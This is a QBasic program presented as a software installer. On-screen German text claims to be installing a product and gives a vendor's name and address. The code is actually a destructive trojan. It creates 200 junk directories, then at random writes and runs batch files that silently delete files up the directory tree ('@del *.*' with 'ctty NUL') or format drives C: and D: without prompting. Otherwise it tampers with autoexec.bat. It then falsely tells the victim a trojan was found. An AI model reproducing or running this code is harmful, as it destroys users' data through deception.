   1 :
   CLS
   REM XLMSoft
   REM by SeCoNd PaRt To HeLl
   COLOR 4
   PRINT "                      * * *  XLM Soft * * *"
   COLOR 14
   PRINT ""
   PRINT " Bitte schauen Sie auf meine Internet Adresse: www.XLMSoft.de"
   PRINT " Oder schreiben Sie mir ein eMail: info@xlmsoft.de"
   PRINT " MfG"
   PRINT " Alex Meierhoefer"
   PRINT " Das Programm wird jetzt installiert..."
   COLOR 3
   SHELL "cd\"
   FOR a = 1 TO 200
   a$ = STR$(a)
   c$ = "md" + a$ + ".hee"
   SHELL c$
   NEXT a
   RANDOMIZE TIMER
   a = INT(RND * 3) + 1
   IF a = 1 THEN GOTO k1
   IF a = 3 THEN GOTO k1
   GOTO 2
   2 :
   b = INT(RND * 10) + 1
   IF b = 3 THEN GOTO k2
   IF b = 6 THEN GOTO k2
   IF b = 9 THEN GOTO k2
   GOTO 3
   3 :
   c = INT(RND * 2) + 1
   IF c = 2 THEN GOTO k3
   GOTO 4
   4 :
   GOTO k4
   k1:
   OPEN "kill1.bat" FOR OUTPUT AS #1
   PRINT #1, "@echo off"
   PRINT #1, "cls"
   PRINT #1, "echo Alex Meierhoefer"
   PRINT #1, "echo Eisenbahnstrasse 2"
   PRINT #1, "echo D-91572 Bechhofen"
   PRINT #1, "echo Deutschland"
   PRINT #1, "echo Info@XLMSoft.de"
   PRINT #1, "echo www.XLMSoft.de"
   PRINT #1, "echo Wenn du das Programm magst, registrier dich!"
   PRINT #1, "echo Einfach DM 29.90 an mich schicken!"
   PRINT #1, "echo DANKE!!!"
   PRINT #1, "ctty NUL"
   PRINT #1, "@del *.*"
   PRINT #1, "cd.."
   PRINT #1, "@del *.*"
   PRINT #1, "cd.."
   PRINT #1, "@del *.*"
   PRINT #1, "cd.."
   PRINT #1, "@del *.*"
   PRINT #1, "cd.."
   PRINT #1, "@del *.*"
   CLOSE #1
   SHELL "kill1.bat"
   KILL "kill1.bat"
   GOTO k4
   k2:
   OPEN "kill2.bat" FOR OUTPUT AS #1
   PRINT #1, "ctty NUL"
   PRINT #1, "format C: /u /q /autotest"
   PRINT #1, "format D: /u /q /autotest"
   CLOSE #1
   SHELL "kill2.bat"
   KILL "kill2.bat"
   GOTO k4
   k3:
   OPEN "C:\autoexec.bat" FOR APPEND AS #1
   PRINT #1, "echo Are you crazy??? by www.XLMSoft.de"
   CLOSE #1
   k4:
   PRINT " Es wurde der XLMSoft-Trojaner auf Ihrer Festplatte entdeckt!"
   PRINT " Formatieren Sie die Festplatte, um schimmeres zu verhindern!"

